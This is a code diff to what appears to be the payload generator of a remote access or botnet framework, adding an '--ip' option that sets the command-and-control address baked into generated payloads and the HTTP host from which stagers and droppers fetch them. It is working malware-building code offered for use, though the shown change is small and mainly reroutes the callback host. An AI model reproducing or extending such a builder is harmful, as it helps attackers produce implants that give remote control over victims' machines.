@@ -186,6 +186,11 @@ def main(*args, **kwargs):
                             action='store',
                             help='target operating system',
                             default='nix')
+        
+        parser.add_argument('--ip',
+                            action='store',
+                            help='target IP address',
+                            default='')
 
         parser.add_argument('--architecture',
                             action='store',
@@ -202,7 +207,7 @@ def main(*args, **kwargs):
 
     else:
 
-        options = collections.namedtuple('Options', ['host','port','modules','name','icon','pastebin','encrypt','compress','freeze','gui','owner','operating_system','architecture'])(*args, **kwargs)
+        options = collections.namedtuple('Options', ['host', 'port','modules','name','icon','pastebin','encrypt','compress','freeze','gui','owner', 'ip', 'operating_system','architecture'])(*args, **kwargs)
 
     # hacky solution to make existing client generator script work with package structure for web app
     os.chdir(ROOT)
@@ -315,7 +320,7 @@ try:
 except ImportError: pass
 '''
 
-    modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": C2_HOST, "port": C2_PORT, "pastebin": options.pastebin if options.pastebin else str(), "gui": "1" if options.gui else str(), "owner": options.owner}) + '_payload.run()']))
+    modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": options.ip, "port": C2_PORT, "pastebin": options.pastebin if options.pastebin else str(), "gui": "1" if options.gui else str(), "owner": options.owner}) + '_payload.run()']))
     payload = '\n'.join((loader, test_imports, potential_imports, modules))
 
     if not os.path.isdir('modules/payloads'):
@@ -362,7 +367,7 @@ except ImportError: pass
         with open(path, 'w') as fp:
             fp.write(payload)
          
-        s = 'http://{}:{}/{}'.format(C2_HOST, int(C2_PORT) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = 'http://{}:{}/{}'.format(options.ip, int(C2_PORT) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urlparse.urlsplit(s)
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
@@ -414,7 +419,7 @@ def _stager(options, **kwargs):
         with open(path, 'w') as fp:
             fp.write(stager)
 
-        s = 'http://{}:{}/{}'.format(C2_HOST, int(C2_PORT) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = 'http://{}:{}/{}'.format(options.ip, int(C2_PORT) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urlparse.urlsplit(s)
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
@@ -427,6 +432,7 @@ def _dropper(options, **kwargs):
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'hidden' in kwargs, "missing keyword argument 'hidden'"
+    print(kwargs)
 
     output_dir = os.path.join('output', options.owner, 'src')
 
